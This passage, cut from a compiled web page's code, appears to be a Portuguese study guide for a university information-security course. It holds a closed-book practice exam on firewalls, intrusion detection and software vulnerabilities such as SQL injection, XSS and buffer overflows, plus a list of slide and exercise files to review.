wght-0 slnt-3 step-1">5</span> <span class="cut mono-4 wght-1 slnt-3 step-3">m</span><span class="cut mono-1 wght-4 slnt-1 step-1">i</span><span class="cut mono-4 wght-0 slnt-0 step-0">n</span><span class="cut mono-1 wght-1 slnt-0 step-0">u</span><span class="cut mono-3 wght-2 slnt-1 step-0">t</span><span class="cut mono-2 wght-2 slnt-3 step-1">o</span><span class="cut mono-1 wght-2 slnt-1 step-1">s</span><span class="cut mono-5 wght-2 slnt-0 step-3">,</span> <span class="cut mono-3 wght-3 slnt-0 step-0">s</span><span class="cut mono-0 wght-2 slnt-3 step-3">e</span><span class="cut mono-0 wght-0 slnt-0 step-2">m</span> <span class="cut mono-1 wght-4 slnt-4 step-3">c</span><span class="cut mono-1 wght-2 slnt-1 step-3">o</span><span class="cut mono-2 wght-2 slnt-4 step-3">n</span><span class="cut mono-4 wght-5 slnt-2 step-0">s</span><span class="cut mono-3 wght-4 slnt-2 step-3">u</span><span class="cut mono-4 wght-1 slnt-4 step-3">l</span><span class="cut mono-4 wght-0 slnt-4 step-3">t</span><span class="cut mono-5 wght-3 slnt-3 step-2">a</span><span class="cut mono-1 wght-2 slnt-1 step-2">)</span> <a class="header-anchor" href="#_9-simulado-45-minutos-sem-consulta" aria-hidden="true">#</a></h2><p>Respostas nos baralhos da seção 7.</p><ol><li>Enuncie os três objetivos de projeto do firewall de [BELL94] e como cada um é alcançado. (F2)</li><li>Defina um IDS e nomeie seus três componentes lógicos. (D4)</li><li>Por que o programa em C da aula sobrescreve &quot;Gabriel&quot;? O que o GCC imprime? (V7)</li><li>Filtro positivo versus negativo: qual regra é implícita no final de cada um? (F5)</li><li>A detecção por assinatura não detecta que tipo de ataque? Por quê? (D9, D10)</li><li>Defina programação defensiva e sua regra principal. (V3)</li><li>Explique a falha na regra 4 da Tabela 9.1 e a exploração na porta 8080. (F7)</li><li>Interpretação frouxa versus estrita: qual erro cresce em cada uma? (D6)</li><li>Injeção de SQL: mostre a entrada que apaga a tabela e nomeie duas defesas. (V9)</li><li>O que o firewall com estado acrescenta ao filtro de pacotes? O que é a tabela de estado? (F9)</li><li>Quatro fontes de dados de um HIDS, com uma desvantagem cada. (D11)</li><li>Lista branca versus lista negra: qual é recomendada e por quê? (V12)</li><li>Por que o flag ACK é necessário na regra 4 refinada, além da porta de origem 25? (F7)</li><li>Sensor em linha versus passivo: qual pode ser um IPS? (D14)</li><li>O que é canonicalização e por que precisa vir antes da validação? (V12)</li><li>Proxy de aplicação versus proxy de circuito: qual examina a carga útil? (F11, F12)</li><li>As três posições do honeypot: qual captura internos, qual não traz risco interno? (D16)</li><li>Heartbleed: ano, software, classe de falha, o que vazou. (V8)</li><li>Três propósitos do firewall interno em uma DMZ. (F15)</li><li>Escreva o cabeçalho da regra do Snort e explique <code>![7680,1521]</code>. (D17)</li><li>XSS: quem é o alvo real, e quais dois passos de tratamento falharam? (V11)</li><li>Onde o IPsec deve ficar: atrás do firewall, no roteador, ou no firewall? Por quê? (F16)</li><li>Explique a falácia da taxa-base para um IDS. (D6)</li><li>Ataques ao PATH e ao LD_LIBRARY_PATH, e duas mitigações. (V14)</li><li>Por que DROP é mais furtivo que REJECT contra uma varredura de portas? (F18)</li><li>Os seis passos da metodologia de ataque, um exemplo cada. (D3)</li><li>As cinco falhas de código do OWASP e as três categorias do CWE/SANS. (V1)</li><li>SOCKS: RFC, porta, os cinco passos TCP. (F12)</li></ol><hr><p><strong>Arquivos úteis no repositório:</strong></p><ul><li><code>ICP473-Slides/slides-ICP473-Segurança-da-Informação.pdf</code> (619 páginas, a P3 começa no 448)</li><li><code>ICP473-Slides/slides-por-aula/aula14-firewalls.tex</code>, <code>aula15-idsips.tex</code>, <code>aula16-vulnSoftware.tex</code></li><li><code>ICP473-Listas/lista8.pdf</code>, <code>lista9.pdf</code></li></ul><p>Compile e rode o programa de estouro de buffer dos slides 588 a 592 antes da prova, com e sem <code>-fno-stack-protector</code>.</p>',499))])))};export{p as default};
